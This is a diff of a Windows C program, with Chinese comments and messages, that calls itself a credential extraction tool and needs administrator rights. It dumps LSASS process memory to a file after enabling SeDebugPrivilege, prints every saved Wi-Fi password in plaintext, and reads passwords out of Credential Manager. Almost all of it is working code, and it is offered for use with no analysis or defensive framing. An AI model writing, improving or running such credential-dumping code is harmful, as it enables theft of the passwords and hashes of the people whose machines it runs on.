@@ -1,8 +1,8 @@
-// 文件：laztool.c
-// 编译：x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool.c /link wlanapi.lib dbghelp.lib credui.lib
-// 运行：必须以管理员身份运行
+// 文件：laztool_final.c
+// 编译：x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool_final.c /link wlanapi.lib dbghelp.lib credui.lib
+// 运行：管理员身份运行
 
-#define _WIN32_WINNT 0x0601  // Windows 7+，确保 WLAN 常量可用
+#define _WIN32_WINNT 0x0601
 #include <windows.h>
 #include <wlanapi.h>
 #include <tlhelp32.h>
@@ -11,7 +11,6 @@
 #include <wincred.h>
 #include <shlwapi.h>
 
-// 如果 wlanapi.h 未定义此常量，手动定义
 #ifndef WLAN_PROFILE_GET_PLAINTEXT
 #define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
 #endif
@@ -20,6 +19,14 @@
 #pragma comment(lib, "dbghelp.lib")
 #pragma comment(lib, "credui.lib")
 #pragma comment(lib, "shlwapi.lib")
+
+// 辅助：输出宽字符串（使用 printf + %S）
+void PrintW(const wchar_t* format, ...) {
+    va_list args;
+    va_start(args, format);
+    vwprintf(format, args);  // 还是用 wprintf 但确保控制台代码页
+    va_end(args);
+}
 
 BOOL IsElevated() {
     BOOL fRet = FALSE;
@@ -79,20 +86,21 @@ DWORD GetProcessPid(const wchar_t* procName) {
 }
 
 void DumpLsass() {
-    wprintf(L"\n[+] ===== 模块1: LSASS 内存转储 =====\n");
+    printf("\n[+] ===== 模块1: LSASS 内存转储 =====\n");
     if (!EnableDebugPrivilege()) {
-        wprintf(L"[-] 启用 SeDebugPrivilege 失败，请以管理员身份运行。\n");
+        printf("[-] 启用 SeDebugPrivilege 失败，请以管理员身份运行。\n");
         return;
     }
+    printf("[*] SeDebugPrivilege 已启用。\n");
     DWORD pid = GetProcessPid(L"lsass.exe");
     if (pid == 0) {
-        wprintf(L"[-] 未找到 lsass.exe 进程。\n");
+        printf("[-] 未找到 lsass.exe 进程。\n");
         return;
     }
-    wprintf(L"[*] 找到 LSASS PID: %lu\n", pid);
+    printf("[*] 找到 LSASS PID: %lu\n", pid);
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
     if (!hProcess) {
-        wprintf(L"[-] 打开进程失败，错误码: %lu\n", GetLastError());
+        printf("[-] 打开进程失败，错误码: %lu\n", GetLastError());
         return;
     }
     wchar_t dumpPath[MAX_PATH];
@@ -100,39 +108,44 @@ void DumpLsass() {
     wcscat_s(dumpPath, MAX_PATH, L"lsass.dmp");
     HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        wprintf(L"[-] 创建转储文件失败，错误码: %lu\n", GetLastError());
+        printf("[-] 创建转储文件失败，错误码: %lu\n", GetLastError());
         CloseHandle(hProcess);
         return;
     }
     BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
     if (success) {
-        wprintf(L"[+] LSASS 转储成功 -> %ls\n", dumpPath);
+        printf("[+] LSASS 转储成功 -> %S\n", dumpPath);
     } else {
         DWORD err = GetLastError();
-        wprintf(L"[-] MiniDumpWriteDump 失败，错误码: 0x%08X (%lu)\n", err, err);
+        printf("[-] MiniDumpWriteDump 失败，错误码: 0x%08X (%lu)\n", err, err);
     }
     CloseHandle(hFile);
     CloseHandle(hProcess);
 }
 
 void DumpWifiPasswords() {
-    wprintf(L"\n[+] ===== 模块2: Wi-Fi 明文密码 =====\n");
+    printf("\n[+] ===== 模块2: Wi-Fi 明文密码 =====\n");
     HANDLE hClient = NULL;
     DWORD dwCurVersion = 0;
-    if (WlanOpenHandle(2, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS) {
-        wprintf(L"[-] WlanOpenHandle 失败，请检查 WLAN AutoConfig 服务。\n");
+    DWORD dwResult = WlanOpenHandle(2, NULL, &dwCurVersion, &hClient);
+    if (dwResult != ERROR_SUCCESS) {
+        printf("[-] WlanOpenHandle 失败，错误码: %lu。请确保 WLAN AutoConfig 服务正在运行。\n", dwResult);
         return;
     }
+    printf("[*] WLAN API 初始化成功。\n");
     PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
-    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS) {
-        wprintf(L"[-] 未找到无线网卡。\n");
+    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
+    if (dwResult != ERROR_SUCCESS) {
+        printf("[-] WlanEnumInterfaces 失败，错误码: %lu。没有无线网卡或驱动问题。\n", dwResult);
         WlanCloseHandle(hClient, NULL);
         return;
     }
+    printf("[*] 找到 %lu 个无线接口。\n", pIfList->dwNumberOfItems);
     int found = 0;
     for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
         PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
         if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS) {
+            printf("[*] 接口 %lu 上有 %lu 个配置文件。\n", i, pProfileList->dwNumberOfItems);
             for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                 WLAN_PROFILE_INFO profile = pProfileList->ProfileInfo[j];
                 DWORD flags = WLAN_PROFILE_GET_PLAINTEXT;
@@ -148,39 +161,46 @@ void DumpWifiPasswords() {
                             while (keyEnd > keyStart && iswspace(*(keyEnd-1))) keyEnd--;
                             wchar_t saved = *keyEnd;
                             *keyEnd = L'\0';
-                            wprintf(L"[+] SSID: %-20ls -> 密码: %ls\n", profile.strProfileName, keyStart);
+                            printf("[+] SSID: %-20S -> 密码: %S\n", profile.strProfileName, keyStart);
                             *keyEnd = saved;
                             found++;
                         } else {
-                            wprintf(L"[?] SSID: %-20ls -> 有<keyMaterial>但无结束标签\n", profile.strProfileName);
+                            printf("[?] SSID: %-20S -> 有<keyMaterial>但无结束标签\n", profile.strProfileName);
                         }
                     } else {
-                        wprintf(L"[i] SSID: %-20ls -> 无密码（开放网络或企业认证）\n", profile.strProfileName);
+                        printf("[i] SSID: %-20S -> 无密码（开放网络或企业认证）\n", profile.strProfileName);
                     }
                     WlanFreeMemory(xml);
+                } else {
+                    printf("[-] 无法获取配置文件 %S 的详细信息，可能权限不足。\n", profile.strProfileName);
                 }
             }
             WlanFreeMemory(pProfileList);
+        } else {
+            printf("[-] 接口 %lu 无法获取配置文件列表。\n", i);
         }
     }
     WlanFreeMemory(pIfList);
     WlanCloseHandle(hClient, NULL);
-    if (found == 0) wprintf(L"[-] 未找到任何保存明文密码的 Wi-Fi。\n");
+    if (found == 0) printf("[-] 未找到任何保存明文密码的 Wi-Fi 配置文件。\n");
+    else printf("[+] 共找到 %d 个 Wi-Fi 密码。\n", found);
 }
 
 void DumpCredentialManager() {
-    wprintf(L"\n[+] ===== 模块3: 凭据管理器 =====\n");
+    printf("\n[+] ===== 模块3: 凭据管理器 =====\n");
     PCREDENTIALW *creds = NULL;
     DWORD count = 0;
     if (!CredEnumerateW(NULL, 0, &count, &creds)) {
-        wprintf(L"[-] CredEnumerate 失败，错误码: %lu\n", GetLastError());
+        DWORD err = GetLastError();
+        printf("[-] CredEnumerate 失败，错误码: %lu。可能没有保存的凭据或服务未启动。\n", err);
         return;
     }
+    printf("[*] 找到 %lu 个凭据。\n", count);
     int found = 0;
     for (DWORD i = 0; i < count; i++) {
         PCREDENTIALW cred = creds[i];
-        wprintf(L"\n目标: %ls\n", cred->TargetName ? cred->TargetName : L"(null)");
-        wprintf(L"用户名: %ls\n", cred->UserName ? cred->UserName : L"(空)");
+        printf("\n目标: %S\n", cred->TargetName ? cred->TargetName : L"(null)");
+        printf("用户名: %S\n", cred->UserName ? cred->UserName : L"(空)");
         if (cred->CredentialBlobSize && cred->CredentialBlob) {
             BYTE* blob = cred->CredentialBlob;
             DWORD size = cred->CredentialBlobSize;
@@ -192,7 +212,7 @@ void DumpCredentialManager() {
                 BOOL ok = TRUE;
                 for (int k = 0; k < wlen; k++) if (w[k] < 0x20 && w[k] != 0) { ok = FALSE; break; }
                 if (ok && wlen > 0) {
-                    wprintf(L"密码: %.*ls\n", wlen, w);
+                    printf("密码(宽): %.*S\n", wlen, w);
                     found++;
                     continue;
                 }
@@ -202,61 +222,63 @@ void DumpCredentialManager() {
             BOOL ok = TRUE;
             for (DWORD k = 0; k < size; k++) if (a[k] < 0x20 && a[k] != 0) { ok = FALSE; break; }
             if (ok && size > 0) {
-                printf("密码: %.*s\n", size, a);
+                printf("密码(ANSI): %.*s\n", size, a);
                 found++;
                 continue;
             }
             // 二进制显示
-            wprintf(L"密码(hex): ");
-            for (DWORD k = 0; k < min(size, 64); k++) wprintf(L"%02X ", blob[k]);
-            wprintf(L"\n");
+            printf("密码(hex): ");
+            for (DWORD k = 0; k < min(size, 64); k++) printf("%02X ", blob[k]);
+            printf("\n");
             found++;
         } else {
-            wprintf(L"密码: (空)\n");
+            printf("密码: (空)\n");
         }
     }
     CredFree(creds);
-    if (found == 0) wprintf(L"[-] 未提取到任何含密码的凭据。\n");
+    if (found == 0) printf("[-] 未提取到任何含密码的凭据。\n");
+    else printf("[+] 共提取 %d 个凭据密码。\n", found);
 }
 
 void DemonstrateDPAPI() {
-    wprintf(L"\n[+] ===== 模块4: DPAPI 测试 =====\n");
+    printf("\n[+] ===== 模块4: DPAPI 测试 =====\n");
     wchar_t testData[128] = L"DPAPI_Test_String_For_CurrentUser";
     DATA_BLOB in;
     in.pbData = (BYTE*)testData;
-    in.cbData = (DWORD)((wcslen(testData) + 1) * sizeof(wchar_t));  // 强制转换解决 C2065
+    in.cbData = (DWORD)((wcslen(testData) + 1) * sizeof(wchar_t));
     DATA_BLOB encrypted = {0}, decrypted = {0};
     if (!CryptProtectData(&in, L"Test", NULL, NULL, NULL, 0, &encrypted)) {
-        wprintf(L"[-] CryptProtectData 失败，错误码: %lu\n", GetLastError());
+        printf("[-] CryptProtectData 失败，错误码: %lu\n", GetLastError());
         return;
     }
-    wprintf(L"[*] 加密成功，大小: %lu 字节\n", encrypted.cbData);
+    printf("[*] 加密成功，加密后大小: %lu 字节\n", encrypted.cbData);
     if (!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted)) {
-        wprintf(L"[-] CryptUnprotectData 失败，错误码: %lu\n", GetLastError());
+        printf("[-] CryptUnprotectData 失败，错误码: %lu\n", GetLastError());
         LocalFree(encrypted.pbData);
         return;
     }
-    wprintf(L"[+] 解密成功: %ls\n", (wchar_t*)decrypted.pbData);
+    printf("[+] 解密成功: %S\n", (wchar_t*)decrypted.pbData);
     LocalFree(encrypted.pbData);
     LocalFree(decrypted.pbData);
 }
 
 int main() {
+    // 设置控制台输出代码页为 UTF-8，使 printf 能正确显示中文（如果控制台字体支持）
     SetConsoleOutputCP(CP_UTF8);
-    wprintf(L"=========================================================\n");
-    wprintf(L"     Windows 凭据提取工具 v3.0 (管理员运行)             \n");
-    wprintf(L"=========================================================\n");
+    printf("=========================================================\n");
+    printf("     Windows 凭据提取工具 v4.0 (管理员运行)             \n");
+    printf("=========================================================\n");
     if (!IsElevated()) {
-        wprintf(L"\n[-] 请以管理员身份运行此程序。\n");
-        wprintf(L"    右键 -> 以管理员身份运行。\n");
-        getwchar();
+        printf("\n[-] 请以管理员身份运行此程序。\n");
+        printf("    右键 -> 以管理员身份运行。\n");
+        getchar();
         return 1;
     }
-    wprintf(L"[+] 管理员权限已确认\n");
+    printf("[+] 管理员权限已确认\n");
     DumpLsass();
     DumpWifiPasswords();
     DumpCredentialManager();
     DemonstrateDPAPI();
-    wprintf(L"\n[*] 执行完毕。\n");
+    printf("\n[*] 执行完毕。\n");
     return 0;
 }
